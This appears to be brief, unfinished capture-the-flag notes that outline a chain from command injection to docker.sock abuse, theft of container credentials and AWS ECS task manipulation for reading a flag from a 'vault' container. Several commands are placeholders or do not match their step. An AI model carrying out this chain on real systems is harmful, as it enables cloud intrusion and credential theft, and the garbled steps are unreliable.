1. Exploit the website via command injection.

    `; one-liner`

2. Use the docker.sock to deploy a new container 

    `aws configure --profile ruse`

3. List the container on the host

    `docker ps`

4. Get the container credentials from the "privd" container. 

    `docker exec -it <container_id> curl blah `

5. List the clusters in the account 

    `aws ecs list-clusters --profile privd`

6. List tasks in the cluster

    `aws ecs list-tasks --cluster <CLUSTER ARN> --profile ruse`

7. List container instances 

    `aws ecs  `

8. Set container instance to DRANING 

    `aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_template.json`

9. Wait for "Vault" container to be rescheduled. 

    `docker ps`

10. Get the flag from the "vault" container 

    `docker exec -it <container_id> cat FLAG.txt`